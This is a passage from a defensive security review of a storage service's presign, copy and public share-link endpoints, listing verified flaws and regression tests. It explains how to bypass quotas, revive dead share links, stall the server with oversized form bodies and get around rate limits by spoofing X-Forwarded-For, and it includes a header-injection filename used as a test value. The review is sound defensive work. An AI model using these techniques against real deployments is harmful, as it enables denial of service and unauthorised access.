- **Side effects:** presign returns `{"url": ..., "expires_in": expires}` (web/app.py:3943) and nothing is written to the database. The URL is an anonymous bearer credential for **one GET** of exactly the path encoded by `presign_get_url` (bucket + quoted key segments), signed with the selected S3 credential's secret and `X-Amz-Expires` in 1..604800 (sigv4.py:284-285, 318-319). Because verification is online, the URL stops working as soon as that S3 credential is revoked, expires, or loses `s3:GetObject` (`lookup_secret` → `S3CredentialStore.resolve`, sigv4.py:262-264, credentials.py:226-242; pinned by `test_expired_and_revoked_presigned_get_put_never_touch_telegram`, tests/s3/test_s3_contract.py:134). It does **not** stop when the admin's session or API key is revoked, and there is no per-URL revocation. GET is read-only, so object lock/retention does not constrain it. Copy commits one SQL transaction (teledrive/storage/copy.py:80-166): a new `storage_objects` row (`status=ready`, copied size/sha256), an `storage_object_aliases` row pointing at the resolved base content (`no Telegram traffic`), copied tags (91-94), copied HTTP metadata (95-99), copied multipart ETag/part layout (100-107), a create-or-CAS head swap (109-145), a `published_versions` row (146), plus notification and metadata-journal rows (147-165), then `commit()` (166). No Telegram upload/download occurs and no bytes are deleted; the returned body reads the generation again after commit (web/app.py:4113-4114).
- **Failure modes:** presign — 200; 401 no auth; 403 no/mismatched CSRF header, cross-origin `Origin`, viewer role, key lacking the route scope; 404 unknown bucket or key with no current head (web/app.py:3911-3914); 422 missing `key`, non-integer `expires`, unknown/revoked/expired credential, credential without `s3:GetObject`, no active credential (3904-3933); **500** for `expires < 1` or `> 604800` because `presign_get_url`'s `ValueError` is not caught (web/app.py:3936-3939, sigv4.py:284-285; verified: TestClient surfaces the raw `ValueError`, production answers 500), and 500 if the master key cannot be loaded because `load_master_key()`'s `RuntimeError`/`OSError` is not mapped here (web/app.py:3916; contrast the 503 mapping at 5244-5252). Copy — 200; 401; 403; 400 destination equals source (web/app.py:4086-4087); 404 either bucket missing or source key absent (4081-4085, 4104-4105); 409 `CopyConflict`/`ValueError` (concurrent destination change, hash collision, and oversized multibyte destination key, 4096-4107, copy.py:114-145, 168-170); 413 destination quota (4088-4090, 4292-4298); 422 Pydantic key/bucket bounds; 500 on any uncaught SQLAlchemy error and on the post-commit `catalog.get` if another writer removed the head in between (4113-4114). There is no 201 and no 410.
- **Findings:**
  - [high] **Presign hands a non-admin principal a durable anonymous URL that survives the principal's own revocation.** The route is reachable by `operator` and by a bearer key whose only scope is this route (verified: presign-only key → 200), yet the handler never consults `request.state.api_key_expires_at` (set at web/app.py:612-615) and does not require an interactive session. The URL is signed by an arbitrary S3 credential the caller picks (`credential_id`, web/app.py:3908-3931) and remains valid until that *S3 credential* is revoked or `X-Amz-Expires` (up to 604800 s) elapses (sigv4.py:262-264, credentials.py:226-242). Revoking the API key, expiring it, deleting the operator's account, or logging the session out has no effect. This is exactly the class the codebase already fences off elsewhere: share-token creation/listing is admin-only because "A share token IS the credential … outlives their own account" (web/permissions.py:82-85), and credential reveal refuses API keys because it "creates a chain of secret holders" (web/app.py:5150-5174). A presign key can also select a credential it is not allowed to reveal and use it as the signing identity. Fix: require an interactive session (or at least admin) and cap `expires` by the caller's key/session lifetime, or make the issued URL verifiable against a per-URL/actor record.
  - [high] **Copy bypasses the destination bucket's size quota (verified failing).** web/app.py:4089-4090 always passes `incoming_size=0`, but bucket usage counts the full head object size (teledrive/storage/quota.py:32-49, 64-67). With `max_size_bytes=50`, copying a 100-byte source to a *new* destination key returns 200 and leaves usage `(1, 100)`; overwriting a 10-byte destination with the same source also returns 200 and leaves `(1, 100)`. Only the object-count limit is effective (`has_current_key` is false for a new key, quota.py:68-71), and the check is a plain read outside the copy transaction, so concurrent copies race it. A route-scoped copy key or operator can therefore blow through an admin-only quota by any amount (verified over HTTP: 200 + usage over quota; the next copy then gets 413).
  - [high] **Copy ignores the destination bucket's default object lock/retention (verified).** `copy_object` builds the new version itself and never calls `BucketCatalog.apply_default_lock` (teledrive/storage/catalog.py:342-349), which normal publication does call after commit (catalog.py:1074 and 1120). Probe: bucket configured `GOVERNANCE`/1 day, copy into it → the new object's `object_lock_state` is `None` (no `retention_mode`, no `retain_until_ns`). The S3 `CopyObject` path and `restore_published_version` share `copy_object`, so they inherit the gap. A bucket configured to make every write WORM ends up with an unprotected version created by copy.
  - [medium] **Presign signs a path that can differ from the key it verified.** `presign_get_url` rebuilds the path by dropping empty segments and then quoting (`"/" + "/".join(... for segment in (bucket, *key.split("/")) if segment != "")`, teledrive/s3/sigv4.py:290-292), while the verifier deliberately preserves double slashes, dot segments and leading slashes byte-for-byte (`_canonical_path`, sigv4.py:70-81). Verified: key `a//b` → `http://…/probe-bucket/a/b`; key `/lead` → `http://…/probe-bucket/lead`. The handler's existence check was for `a//b`/`/lead` (web/app.py:3913) but the returned bearer URL serves a *different* key (or 404s). Combined with `key.strip()` (web/app.py:3901), an operator can hand out a link they believe is scoped to one object and it opens another. It is not a privilege escalation (the signer is still restricted by the credential's ACL/policy on the encoded path), but it is a wrong-object capability.
  - [medium] **Neither handler records the actor, and copy records no object ids.** `_log(f"presigned URL issued: …", "security")` (web/app.py:3940-3942) and `_log(f"copy object: …", "storage")` (web/app.py:4108-4109) use the default `user="system"` (web/app.py:233), unlike the credential reveal (`user=actor`, web/app.py:5258) and share creation. Copy's line names bucket/keys but not the source or destination object ids/generations, so two concurrent copies of different versions are indistinguishable. Also both messages are written to `LOG_BUFFER`, and `GET /api/v1/logs` is an ordinary read route (web/app.py:3398-3402) available to `viewer`.
  - [medium] **Presign's out-of-range expiry is a 500, and `0` silently becomes one hour.** web/app.py:3904-3907 accepts any integer and then calls a signer that raises `ValueError` outside 1..604800 (sigv4.py:284-285); the exception is uncaught (verified). `expires=0` is swallowed by `payload.get("expires") or 3600`, so a caller asking for an already-expired/no-lifetime URL gets a 3600-second bearer credential instead of an error; `expires=3.7` silently becomes 3. Conversely `expires_in` in the response always echoes the request (web/app.py:3943) even when the selected credential's own `expires_at` is sooner, so the advertised lifetime can exceed the real one.
  - [medium] **Copy's source read has no resource-level authorization.** The handler checks only that the source bucket exists and `catalog.get` finds the key (web/app.py:4081, copy.py:63); it never consults bucket policy/ACL for the source, unlike S3 copy (`_require_source_acl`, web/s3.py:3368). In a deployment that uses bucket ACLs/bucket policies to isolate credentials, a key holding only the admin copy scope can exfiltrate any readable-by-admin source into a bucket it controls while keeping the original in place. If this is intentional ("admin API is cluster-wide"), the summary should say so; today the route summary only says "Copy (rename/move) an object at the catalog level".
  - [low] **Presign's default credential choice is arbitrary to the caller.** With no `credential_id`, it takes `candidates[0]` from a `created_at DESC` listing (web/app.py:3926-3931, credentials.py:204-212). The URL therefore acts as an unrelated, possibly broadly scoped identity whose bucket ACL/policy may allow or deny the key; the response gives the caller no way to know which `access_key` was used (only the log line does). Deterministic selection (e.g. newest credential whose ACL actually permits the key) or requiring `credential_id` would be clearer.
  - [low] **The signed host comes from client-controlled headers.** `_public_s3_origin` takes `Host` in direct mode and `X-Forwarded-Host` when `TRUSTED_PROXY` (web/app.py:3849-3889); only the presence of a trusted proxy is checked, not that the request arrived from it. An operator/key that can set `Host` (or a proxy that does not overwrite `X-Forwarded-*`) can obtain a URL signed for an arbitrary hostname, and an internal upstream name leaks into the URL when TLS terminates in front but `TRUSTED_PROXY` is off. `x-teledrive-csrf` and admin/operator auth make this low, but the signature is bound to whatever host the request claimed, so the URL is portable to that host.
  - [low] **Oversized multibyte destination keys answer 409, not 422.** Pydantic bounds `destination_key` at 1024 *characters* (web/app.py:3675); `_keyhash` rejects >1024 *bytes* with `ValueError` (catalog.py:152-155), which web/app.py:4106-4107 maps to 409 "conflict". 600 × "é" is a malformed key, not a lost race.
  - [low] **Copy's post-commit response can 500 on a benign race.** After `copy_object` commits, the handler calls `catalog.get(destination_bucket, destination_key).generation` (web/app.py:4113-4114). A concurrent delete of that key between commit and this read raises `FileNotFoundError` and escapes as 500 even though the copy succeeded. The handler also does not pass `expected_source_id` (the S3 path does, web/s3.py:3548-3551), so a source overwrite while the request is in flight is invisible to the response.
  - [nit] **Quota is checked before the source is known to exist.** Destination quota runs first (web/app.py:4088-4090) and the source lookup later (4097-4105), so copying a nonexistent source into a full bucket returns 413 instead of 404.
  - **Verified sound (no finding):** the presigned URL's authority is the signing credential, not the caller, and cannot be turned into a write: the signature is over `GET`, and verification derives the action from the method and re-checks `s3:GetObject` at use time (sigv4.py:126-130, 262-270, web/s3.py:4778-4834); revocation and expiry of that credential are enforced online, so a leaked URL dies with the credential; bucket policy/ACL are applied at use time; GET cannot violate retention. Copy is single-transaction and rollback-safe (copy.py:80-173): the object, alias, tags, metadata, MPU layout, version record, notification and journal all commit together or not at all, so a failed copy creates no orphan; the new object owns its own head/version and points at the immutable base, and GC re-checks `object_aliases` before reclaiming shared media (teledrive/storage/gc_collect.py:437-438, 529-531), so a committed copy keeps its bytes. Cross-bucket copy is intentional (copy.py:44-50). SSE-C copies stay decryptable: `encryption_info` resolves the alias to the original marker and the chunk AAD carries the original object id (teledrive/storage/manifest.py:248-255, teledrive/storage/sse.py:153-187), so no plaintext/ciphertext identity confusion arises — but the copy still needs the same customer key. Two copies to the same new key serialize through the head CAS/insert and the loser gets 409 (copy.py:109-145, 168-170).
- **Tests that should exist:**
  - `test_admin_copy_new_key_respects_destination_size_quota` — bucket `max_size_bytes=50`, copy a 100-byte source to a new destination key → 413, no destination head, usage stays at the prior value; repeat with an existing 10-byte destination to cover the overwrite branch. Today both return 200 and usage becomes 100 (verified). **(mandatory regression)**
  - `test_admin_copy_applies_bucket_default_retention` — configure `GOVERNANCE`/1 day on the destination bucket, copy into it, assert `object_lock_state(new_id)["retain_until_ns"]` is ~1 day ahead and `mode == "GOVERNANCE"`; also cover `restore_published_version` and S3 `CopyObject`, which share `copy_object`.
  - `test_presign_out_of_range_expiry_is_422` — `expires` in `{-1, 604801}` must be 422 with no URL; `expires=0` must either be 422 or documented as the default, not silently 3600.
  - `test_presign_preserves_double_slash_and_leading_slash_keys` — publish `a//b` and `/lead`, presign each, assert the returned URL path is `/bucket/a//b` and `/bucket//lead` (byte-for-byte) or the request is rejected.
  - `test_presign_url_lifetime_is_capped_by_the_calling_key` — create an API key expiring in 60 s, presign with `expires=604800`, assert the API refuses or the URL is unusable after 60 s; revoke the key and assert the URL is dead (today it outlives the key).
  - `test_presign_requires_interactive_session_for_credential_selection` — an API key must not be able to sign with a `credential_id` it cannot reveal through `/api/v1/admin/s3-credentials/{id}/secret`.
  - `test_presign_audit_names_the_actor_and_the_credential` — exactly one non-`http` log entry names the acting user/key, the bucket/key and the signing access key, and contains no signature material.
  - `test_admin_copy_audit_names_actor_and_both_versions` — assert the copy log line includes the actor, source `(bucket, key, object id)` and destination `(bucket, key, object id)`.
  - `test_admin_copy_rejects_oversized_multibyte_destination_key_with_422` — 600 × "é" must be 422, matching the upload path, not 409.
  - `test_admin_copy_destination_deleted_between_commit_and_response_does_not_500` — monkeypatch the post-commit `catalog.get` to raise `FileNotFoundError`; assert the response is a successful 200 carrying the committed id/size (or 409), never 500.
- **Verdict:** Both endpoints work and their write path is atomic, but presign lets an operator or route-scoped key mint an anonymous URL that outlives its own revocation and can target the wrong key, while copy under-enforces the destination size quota, skips default retention, and audits neither actor nor object ids.

## /share/{token} — public download

- **Handler:** `public_share_get` web/app.py:5737 and `public_share_post` web/app.py:5759; both delegate to `_stream_share` web/app.py:5689 with the row loaded by `_load_active_share` web/app.py:5669. Supporting: `_share_rate_limited` web/app.py:5622, `_hash_share_password` web/app.py:5640, `_share_html` web/app.py:5648, file-log redaction web/app.py:1271-1285, table `share_links` teledrive/db.py:132-146.
- **Auth model:** none. Access is bounded only by the *possession of the URL* (24 random bytes → `token_urlsafe(24)`, 32 chars / 192 bits, web/app.py:3990; primary key, teledrive/db.py:134), optionally narrowed by three row predicates in `_load_active_share` (web/app.py:5676-5681): `revoked = 0`, `expires_at IS NULL OR expires_at > now`, `max_downloads IS NULL OR download_count < max_downloads`, plus an optional password (`password_salt`/`password_hash`, PBKDF2-HMAC-SHA256, 200 000 iterations, per-link 16-byte salt, compared with `hmac.compare_digest`, web/app.py:5640-5645, 5775-5776). Nothing binds the token to the object it was created for: the row stores `(bucket, object_key)`, not an object id/version (teledrive/db.py:135-136). No bucket policy, ACL, legal-hold, retention or archive state is re-evaluated at download time.
- **Inputs:** (1) path `token` — validated by `re.fullmatch(r"[A-Za-z0-9_-]{16,64}")` *before* any DB access (web/app.py:5671-5672; verified: 0 `db_connect` calls for a malformed token, and a 5 000-char bad token costs 0.005 ms, so no ReDoS and no oversized lookup). (2) POST body — read as `application/x-www-form-urlencoded` and parsed with `urllib.parse.parse_qs(raw)` (web/app.py:5772-5774); only the first `password` value is used, and the parse has no field-count cap. Body size is bounded only by the *global* `MAX_REQUEST_BYTES` = 32 MiB (web/app.py:81, 1316-1332). (3) Headers read: `Host` (trusted-host middleware, web/app.py:1265-1268) and the ASGI client address as `request.client.host` (web/app.py:5738, 5760). Query string, cookies, `Range`, `If-*`, `Authorization` are all ignored. (4) GET on a password-protected link returns an HTML form whose `action` echoes the token, escaped with `_html.escape` (web/app.py:5751, 5783).
- **Side effects:** one unconditional `UPDATE share_links SET download_count = download_count + 1 …` **before** the object is resolved or the first byte is produced (web/app.py:5695-5700), committed immediately (5700). One DB connection is checked out for the entire transfer and released in the generator's `finally` (web/app.py:5692-5722), i.e. for the whole duration of a multi-GB download. `_log("share password rejected: token=<first 6 chars>… ip=<ip>", "share")` on each bad password (web/app.py:5777-5778); audit-middleware request/status lines with the token masked by `_redact_log_path` (web/app.py:1284-1305). In-memory rate-limit state in `_share_rate` (web/app.py:5618). No Telegram message is written; the read path is read-only apart from per-chunk scratch files under `STORAGE_SCRATCH_DIR` (engine.py:644-656).
- **Failure modes:**
  - **200, `application/octet-stream`** — claim won, head resolvable, stream produced. GET on an unprotected link, POST with a correct password, and POST on an unprotected link all reach this (web/app.py:5754, 5769, 5787). Headers: `Content-Length: item.size`, `Content-Disposition: attachment; filename*=UTF-8''…`, `X-Content-Type-Options: nosniff` (web/app.py:5727-5732), plus the global `X-Frame-Options`/`Referrer-Policy`/`Permissions-Policy`/`CSP`. **No `Cache-Control`** (verified), **no `Accept-Ranges`**, and `Range` is silently ignored (verified: `Range: bytes=2-5` → 200 with all 16 bytes; `bytes=999999-` → 200 with all 16 bytes).
  - **200, `text/html`, password form** — GET on a link with `password_salt` set (web/app.py:5746-5753). Consumes rate-limit quota, not a download slot (verified: `download_count` stays 0).
  - **404, `text/html` "Link not found or expired"** — one path, one byte-identical body, for: malformed token (5671), unknown token, revoked, expired, count-exhausted (5676-5681), object unlinked or replaced by an S3 delete marker (5704-5706), **and any DB exception** (5683-5684 swallows it). Verified 404 for malformed, unknown, expired, unlinked and delete-marked rows.
  - **401, `text/html` "Incorrect password"** — POST with wrong, empty or missing `password` (web/app.py:5776-5786). Verified 401 and `download_count == 0` after three wrong passwords, so the gate does not consume the slot.
  - **429, JSON `{"detail":"Too many requests"}`** — the 61st request in a 60 s window from one client address, shared across *all* tokens and both methods (web/app.py:5622-5637, 5739-5740, 5761-5762). Verified: first 429 at request 61.
  - **200 with a short body** — any error after the response starts (missing/corrupt Telegram chunk, `IntegrityError`, `SSECError`) escapes from `stream()` (web/app.py:5717-5722) after Starlette has sent the status line and the full `Content-Length`, so a real client receives `200` + truncated bytes; the slot is already spent. Verified the exception and the counter increment; the on-the-wire truncation is Starlette's normal behaviour for a mid-generator raise (**unverified** against a socket).
  - **405** on `HEAD /share/{token}` (verified; `Allow: GET`).
  - **413 / 400** from the global body middleware before the route runs (`Content-Length` > 32 MiB, or unparsable `Content-Length`), web/app.py:1320-1331. Never 422: the token is a bare `str` path parameter, not a pydantic model.
- **Findings:**
  - [high] **Every 404 and every failed stream permanently consumes a download slot.** The counter is incremented before the object is resolved (web/app.py:5695-5700) and the claim's conditions do not include object existence, readability, or even expiry. Verified: a share with `max_downloads=10` whose object was unlinked (or replaced by a delete marker) returned 404 four times and ended with `download_count == 4`; a share whose Telegram chunk was missing raised mid-stream and also ended at 1. Practical effect: any URL unfurler, mail/chat link preview, or retry loop silently burns the quota (verified `counter 1→4` from four plain 404 GETs), a deleted object can exhaust a live link without anyone downloading it, and the "max N downloads" contract is not a count of downloads. Fix: resolve the object (and check expiry) *inside* the same conditional UPDATE, or do the increment after the first chunk is ready and refund on failure.
  - [high] **The link is bound to a key, so it follows replacement and is revived by re-upload.** `share_links` stores `bucket`/`object_key` (teledrive/db.py:135-136) and `_stream_share` re-resolves the *current head* by that key at download time (web/app.py:5691, 5704). Verified end-to-end: share → GET `ORIGINAL` → unlink → 404 → re-upload different bytes to the same key → the same token returns `200 NEW-CONTENT`. A capability that was dead (and that an operator may have relied on as revoked) becomes a live anonymous download for content it was never scoped to, with the counter partially spent by the 404s. Fix: store `object_id` (the manifest id is immutable and already available from `ObjectHead`) plus generation, and 404 when the head no longer matches; alternatively actively revoke `share_links` rows on unlink/replace.
  - [high] **A password guess costs 103 ms of the event loop, and the body parser in front of it is unbounded.** `hashlib.pbkdf2_hmac(..., 200_000)` runs synchronously inside an `async def` handler (web/app.py:5640-5645 called from 5775) on a single-worker uvicorn (`workers=1`, web/unified.py:75). Measured 103.4 ms per 200 000-iteration hash on this host, i.e. every wrong password stalls *all* requests for ~0.1 s. Worse, `parse_qs` has no `max_num_fields`: a 32 MiB body of `password=a&…` (the middleware's own cap, web/app.py:81, 1327-1332) produced 3 050 402 fields and took **6.41 s** in a single call (measured) — before any password is even checked. So a holder of one password-protected link (or anyone who guesses/finds one) can pin the worker at will within the 60/min budget; the rate limiter is inside the handler and therefore does not protect the body buffering that happens in the middleware. Fix: `run_in_threadpool` (or a bounded hashing pool) for PBKDF2, `parse_qs(..., max_num_fields=8, keep_blank_values=False)`, and a small per-route body cap (a password is 1..128 bytes, web/app.py:3975-3977).
  - [high] **The rate limiter's identity is the raw ASGI peer address, which behind the documented proxy is not the client, and which the app never derives from `X-Forwarded-For` itself.** Both handlers key on `request.client.host` (web/app.py:5738, 5760); the app never reads `X-Forwarded-For` (no match in web/app.py) and never sets `FORWARDED_ALLOW_IPS` (web/unified.py:73-78), so uvicorn's default trusted list is `127.0.0.1,::1` (uvicorn/config.py:363, installed version 0.34.3). Two failure directions: (a) if the reverse proxy reaches the container from an address that is *not* loopback — the normal case for a proxy in another container or through userland docker-proxy — uvicorn ignores `X-Forwarded-For` entirely, every public user collapses into one bucket, and one client's 60 requests/min 429 every other user of every share link; (b) if an operator sets `FORWARDED_ALLOW_IPS=*` to fix that (nothing else is documented for it, docs/REVERSE_PROXY.md only covers `TELEDRIVE_TRUSTED_PROXY` for the scheme), uvicorn trusts the leftmost `X-Forwarded-For` entry (uvicorn `_TrustedHosts.get_trusted_client_host`, verified in the installed source) and the limiter is bypassed by sending a new fake IP per request — which is exactly the brute-force guard for the password gate. Verified in-process that a non-trusted peer's `X-Forwarded-For: 9.9.9.9` does **not** open a new bucket (still 429); the collapse/ bypass behaviour depends on deployment and is **unverified** here.
  - [medium] **No `Cache-Control` on any `/share/` response.** `security_middleware` adds `no-store` only for `/`, `/docs`, `/redoc`, `/openapi.json`, `/api/*` and `/site/*` (web/app.py:1361-1364), so the object bytes, the password form and the 404 page carry none (verified header dump: `cache-control` absent on the 200 stream). A shared proxy or a browser may store a capability-addressed download of exactly the content that was meant to be expiring/counted; a cached body also defeats `max_downloads`. Fix: add `request.url.path.startswith("/share/")` to the `no-store` set, plus `Vary: *`/`X-Robots-Tag: noindex` on the form.
  - [medium] **Expiry is enforced at load time but not at claim time.** `_load_active_share` filters `expires_at > now` (web/app.py:5679-5680) while the claiming `UPDATE` (web/app.py:5695-5699) re-checks only `revoked` and `max_downloads`. A link that expires between the two statements is still served — a small window on GET, but on POST it straddles a 103 ms PBKDF2 (measured), and an admin revoking in that window is honoured while expiry is not. Code-derived; the race itself is **unverified**. Fix: include `AND (expires_at IS NULL OR expires_at > :now)` in the UPDATE.
  - [medium] **Objects the endpoint cannot serve are shareable, and the failure surfaces after the headers.** `admin_create_share` accepts any resolvable head (web/app.py:3984-3987) including an SSE-C object; `_stream_share` then calls `engine.iter_bytes(item.id)` with no `sse_key` (web/app.py:5719), which raises `SSECError` on the first iteration (teledrive/storage/engine.py:632-636) — after `Content-Length` was sent, so the client gets a truncated 200 and loses the slot. Archived objects (`ARCHIVE_ACCESS`/`DEEP_ARCHIVE_ACCESS` without a restore window) are likewise shared and streamed with no `InvalidObjectState` gate, which is the same read-policy bypass already recorded for the authenticated REST GET. **Unverified** end-to-end for this route (needs an SSE-C/archived object created over S3); the code path is unambiguous.
  - [medium] **No per-link password attempt counter, only an IP bucket.** Wrong guesses are bounded solely by `_share_rate_limited`, which is global per IP and shared across tokens (web/app.py:5616-5637); `share_links` has no `failed_attempts`/`locked_until` column (teledrive/db.py:132-146). A distributed set of source addresses, or the XFF bypass above, gets unbounded guesses against a 128-character password space; 200 000 PBKDF2 iterations (~103 ms, measured) is also below the 600 000 OWASP figure for PBKDF2-HMAC-SHA256, though it is defensible *if* attempts are truly capped. Fix: count failures per token (independent of IP), back off exponentially, and only then consider raising the iteration count.
  - [low] **A failed lookup turns a DB outage into "link expired".** `except Exception: return None` (web/app.py:5683-5684) means a broken pool, a locked SQLite file or a schema error answers 404 for a link that is perfectly valid. That is good for confidentiality and bad for operability: a total catalog outage is indistinguishable from a stale URL, and nothing is logged. Fix: log the exception once and return the same 404.
  - [low] **`token[:6]` is written to the operator log.** web/app.py:5777-5778 (and 4006-4007 at create time) emit the first six characters of the credential into `LOG_BUFFER`, which any `viewer` can read via `/api/logs`; the surrounding redaction work (web/app.py:1276-1285) exists precisely because that buffer is not trusted. Six of 32 URL-safe characters leaves ~156 bits, so it is not a forgery path, but it violates the "never log token material" rule for no diagnostic value (log `created_by` or a salted hash instead).
  - [low] **`_share_rate` grows forever below 10 000 keys, and its purge is an O(n) scan on every request above it** (web/app.py:5626-5637). An entry is created for every address that ever calls `/share/` and is only removed by the `len(_share_rate) > 10_000` sweep, which then runs a full scan per request while the dict is large. Bounded in practice for IPv4 sources; an IPv6-capable attacker (or trusted-XFF spoofing) makes the map and the scan the attack surface. Verified only the happy path (`len == 1` after 65 requests from one peer).
  - [low] **Large downloads cannot be resumed and will rarely complete on flaky links.** No `Accept-Ranges`, no `ETag`, no `Range`/`If-Range` handling (verified: a `Range` header is ignored and the full body is returned with 200), unlike the authenticated REST GET which implements byte ranges with `_byte_range`. A dropped 10 GB transfer must restart from zero *and* consumes another slot. There is no security argument for the omission on this route (there is no slot-bypass risk because the counter is per request, not per byte), so treat it as a product gap with a real cost.
  - [low] **`Content-Disposition` has no `filename=` fallback** (web/app.py:5724-5732, verified header `attachment; filename*=UTF-8''data.bin`). Pure-ASCII names are sent only in the RFC 5987 form, which some older clients ignore, yielding an unnamed download. The escaping itself is sound (see below).
  - [nit] **`HEAD /share/{token}` is 405** (verified, `Allow: GET`). Some link checkers, CDNs and `curl -I` workflows treat this as a broken link, and a HEAD that resolved the object without claiming a slot would be a natural liveness probe for an operator.
  - [nit] **`_load_active_share`'s exception handler also hides programming errors** (`AttributeError`, `NameError`) in the same 404 bucket (web/app.py:5683-5684), so a refactor that breaks the SQL shape would look like "all links expired" rather than a deployment failure.
  - **Verified sound (no finding):** the token is format-checked before the first DB access (web/app.py:5671-5672; verified 0 connections for a malformed token) and the query is a primary-key equality with a bound parameter, so an absurd token cannot slow the lookup or grow memory (5 000 chars → 0.005 ms). Token space is 192 bits and the comparison happens in SQLite's index, so there is no timing or prefix oracle over tokens.
  - **Verified sound (no finding):** unknown / expired / revoked / exhausted / object-deleted all return the *same* `_share_html` body with status 404 (web/app.py:5742-5745, 5764-5767, 5702, 5706), so the four states are indistinguishable in status and body. Only "exists and is password-protected" (200 form) vs "does not exist" (404) is distinguishable, which is inherent to serving the gate.
  - **Verified sound (no finding):** the password comparison is `hmac.compare_digest` over fixed-length hex digests (web/app.py:5776), the salt is per link (`secrets.token_hex(16)`, web/app.py:5641) and the plaintext is never stored (teledrive/db.py:142-144), so a stolen database row does not yield the password and no rainbow table applies; a wrong password does **not** touch `download_count` (verified 0 after three bad POSTs, web/app.py:5776-5786 returns before `_stream_share`).
  - **Verified sound (no finding):** the download slot is claimed by one conditional `UPDATE … WHERE … download_count < max_downloads` with a `rowcount == 1` assertion (web/app.py:5695-5702), so concurrent requests cannot over-issue slots — the only defect is *over*-consumption on failure, above.
  - **Verified sound (no finding):** no header injection through the filename. The name is the last path segment of the key and is percent-encoded with `urllib.parse.quote` (web/app.py:5724-5725); verified with hostile keys: `weird\r\nX-Injected: yes.bin` → `weird%0D%0AX-Injected%3A%20yes.bin`, `semi;colon"quote.bin` → `semi%3Bcolon%22quote.bin`, tab → `%09`, and Unicode → UTF-8 percent escapes. No raw CR/LF/quote can reach the header.
  - **Verified sound (no finding):** stored metadata cannot drive `Content-Type`. The media type is hard-coded `application/octet-stream` (web/app.py:5726) with `X-Content-Type-Options: nosniff` (5731) plus `CSP: default-src 'self'; object-src 'none'` and `X-Frame-Options: DENY` from the global middleware (web/app.py:1335-1360), and `Referrer-Policy: no-referrer` stops the token leaking to third parties — an HTML/SVG object shared this way cannot execute on the app origin.
  - **Verified sound (no finding):** object resolution reads only the live head (`BucketCatalog.get` → `storage_object_heads`, teledrive/storage/catalog.py:547-558) and `ManifestStore.get` requires `status == "ready"` (teledrive/storage/manifest.py:508-511), so an S3 delete marker or a retired version is never served (verified: after `delete_marker()` the share answers 404, not zero bytes). Historic versions, removed versions and `removed_versions` are unreachable from this route.
  - **Verified sound (no finding):** the streaming generator closes its DB connection in `finally` (web/app.py:5717-5722) and the pre-stream failure path closes it in `except BaseException` (5713-5715), so no leak on the request-level error paths (an early client disconnect releasing the checkout is a Starlette-lifecycle question already noted elsewhere in this document).
  - *(unverified)* The exact on-the-wire shape of a mid-stream failure against a real socket (truncated `200` with a full `Content-Length` is the expected Starlette behaviour, and the slot loss is verified); and whether the deployed proxy makes the client address loopback, which decides whether finding #4 is an availability collapse or a bypass.
- **Tests that should exist:**
  - `test_share_link_is_bound_to_the_object_it_shared` — create a share, GET `ORIGINAL`, unlink, re-upload different bytes to the same key, then GET the same token and assert **404** (and that the new bytes are not served). Today it returns `200 NEW-CONTENT` (verified). **This is the mandatory regression**: an anonymous download capability must not silently re-target content it was never issued for.
  - `test_share_404_does_not_consume_a_download_slot` — `max_downloads=2`, then unlink the object (and separately publish a delete marker) and issue five GETs; assert every response is 404 **and** `download_count == 0`; re-upload and assert both remaining downloads still succeed and the third is 404. Today the counter reaches 4 on the five 404s (verified).
  - `test_share_stream_failure_refunds_the_slot_and_never_returns_200` — break the transport (`bot.parts.clear()`), GET, assert the client does not receive a 2xx (raw socket: status line + `Content-Length` must not be followed by a short body silently) and `download_count` is unchanged. Today it raises mid-stream and the counter is 1 (verified).
  - `test_share_post_body_is_bounded_before_hashing` — POST a 32 MiB `password=a&…` body to a password-protected link; assert 413 (or 422) in well under a second and that `pbkdf2` is not called; a 3 M-field body must not take 6 s of the event loop.
  - `test_share_password_hashing_does_not_block_the_event_loop` — fire a wrong password and, concurrently, a health check; assert the health check completes in < 20 ms (today a single PBKDF2 costs ~103 ms of the loop).
  - `test_share_rate_limit_uses_the_real_client_behind_a_trusted_proxy` — with uvicorn's `ProxyHeadersMiddleware` in front, assert 60 requests from client A followed by one from client B yields 429 for A and 200 for B, and that rotating `X-Forwarded-For` from an untrusted peer does **not** mint fresh buckets.
  - `test_share_response_is_never_stored` — assert `Cache-Control: no-store` on the 200 stream, the password form and the 404 page.
  - `test_share_expiry_is_rechecked_at_claim` — freeze/advance time between `_load_active_share` and the claiming UPDATE (monkeypatch `time.time` at the second call) and assert 404 with `download_count` unchanged.
  - `test_share_rejects_objects_it_cannot_stream_at_create_time` — create an SSE-C and an archived object, then request a share; assert 422 ("object cannot be served by a public link") instead of a token that yields a truncated 200.
  - `test_share_token_is_never_logged` — read `LOG_BUFFER` after a successful download, a wrong password and a 404, and assert the 32-char token appears in no entry (today the first 6 characters do).
  - `test_share_malformed_token_never_touches_the_database` — monkeypatch `db_connect` to count calls; assert 0 for `short`, 65 chars, `../..`, and a 5 000-char token, all 404.
  - `test_share_wrong_password_does_not_consume_a_slot` — keep the existing assertion (`tests/web/test_rest_transfer.py:264-266`) but add `download_count == 0` and a `max_downloads=1` link that still downloads successfully afterwards.
  - `test_share_filename_header_cannot_be_injected` — keys containing `\r\n`, `"`, `;`, tab and non-ASCII; assert the `Content-Disposition` value contains no raw control character and round-trips through `email.message`/`cgi.parse_header`.
- **Verdict:** The token handling, the password primitive and the "uniform 404" story are genuinely careful, but the endpoint counts 404s as downloads, re-targets whatever object currently occupies the key, and gates nothing on an attacker-supplied 32 MiB body parsed and hashed synchronously on the event loop — so a link is neither a bound capability nor a bounded cost, and the IP-keyed limiter is the wrong shape for the only credential-free surface in the service.

## public website hosting — /site/{bucket}/...

_Line numbers are from the working tree at review time (`web/app.py` blob `c042b1d`; HEAD is `d7881dd` plus uncommitted log/API-key hardening that shifts `web/app.py` by ~+26 lines after `:230`). That file is being edited concurrently, so treat the function names as authoritative anchors._

- **Handler:** `web/app.py:6114` (`GET /site/{bucket}`) and `web/app.py:6119` (`GET /site/{bucket}/{path:path}`), both delegating to `_serve_site` (`web/app.py:6044`). Website config writes: `web/s3.py:1458-1467` (S3 `PutBucketWebsite`), `web/app.py:3932` (admin `PUT .../website`), `web/s3_governance_api.py:853` (governance UI `PUT .../s3-governance/{bucket}/website`). Config model: `teledrive/s3/website.py` (`WebsiteConfigStore`, `validate_document_name`, `parse_website_xml`).
